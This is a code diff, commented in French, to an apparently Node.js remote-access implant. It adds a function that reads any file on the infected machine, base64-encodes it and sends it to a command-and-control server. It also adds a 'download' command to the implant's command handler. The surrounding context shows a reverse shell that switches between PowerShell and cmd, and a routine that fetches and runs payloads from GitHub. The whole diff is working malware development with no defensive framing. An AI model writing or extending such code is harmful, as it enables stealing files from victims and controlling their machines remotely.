@@ -47,6 +47,59 @@ function downloadFile(url, dest) {
   });
 }
 
+// Fonction pour télécharger un fichier local et l'envoyer au C2
+function uploadFileToC2(filePath, client) {
+  try {
+    // Vérifier si le fichier existe
+    if (!fs.existsSync(filePath)) {
+      client.write(`[!] Erreur: Le fichier ${filePath} n'existe pas\n`);
+      return;
+    }
+
+    // Obtenir le nom du fichier
+    const fileName = path.basename(filePath);
+    
+    // Lire le fichier et le convertir en base64
+    client.write(`[i] Lecture du fichier ${filePath}...\n`);
+    
+    try {
+      const fileContent = fs.readFileSync(filePath);
+      const base64Content = fileContent.toString('base64');
+      
+      // Envoyer le fichier au serveur
+      client.write(`[i] Envoi du fichier ${fileName} au serveur...\n`);
+      
+      // Pauser le shell pour éviter des interférences pendant le transfert
+      if (currentShell) {
+        currentShell.stdin.pause();
+      }
+      
+      // Format: __DOWNLOAD__ <filename> <base64_content>
+      // Attendre un peu pour s'assurer que les messages sont traités dans l'ordre
+      setTimeout(() => {
+        // Envoyer le marqueur de début suivi du nom de fichier et des données
+        const downloadMsg = `__DOWNLOAD__ ${fileName} ${base64Content}`;
+        client.write(downloadMsg);
+        
+        // Rétablir le shell après un court délai
+        setTimeout(() => {
+          if (currentShell) {
+            currentShell.stdin.resume();
+          }
+          client.write(`\n[+] Fichier ${fileName} envoyé avec succès\n`);
+        }, 500);
+      }, 200);
+    } catch (readError) {
+      client.write(`[!] Erreur de lecture: ${readError.message}\n`);
+      if (readError.code === 'EACCES') {
+        client.write(`[!] Accès refusé au fichier. Vérifiez les permissions.\n`);
+      }
+    }
+  } catch (error) {
+    client.write(`[!] Erreur lors de l'envoi du fichier: ${error.message}\n`);
+  }
+}
+
 async function executeGitHubPayload(url, client) {
   try {
     // Ensure the target directory exists
@@ -115,6 +168,13 @@ function handleNativeCommand(cmd, client) {
     executeGitHubPayload(parts[1], client);
     return true;
   }
+  
+  if (parts[0] === 'download' && parts.length > 1) {
+    // Reconstruire le chemin complet (pour gérer les chemins avec espaces)
+    const filePath = parts.slice(1).join(' ');
+    uploadFileToC2(filePath, client);
+    return true;
+  }
 
   return false;
 }
@@ -133,11 +193,16 @@ function connect() {
       const input = data.toString();
       const trimmed = input.trim();
       
-      if (trimmed === 'switchshell') {
+      // Traiter d'abord les commandes natives avant de les passer au shell
+      if (handleNativeCommand(trimmed, client)) {
+        // Ne rien faire d'autre si c'est une commande native
+        return;
+      } else if (trimmed === 'switchshell') {
         const newShell = currentShell.spawnfile.includes('powershell') ? 'cmd' : 'powershell';
         client.write(`[i] Bascule vers ${newShell}...\n`);
         startShell(client, newShell);
-      } else if (!handleNativeCommand(trimmed, client)) {
+      } else {
+        // Sinon envoyer au shell
         currentShell.stdin.write(trimmed + '\n');
       }
     });
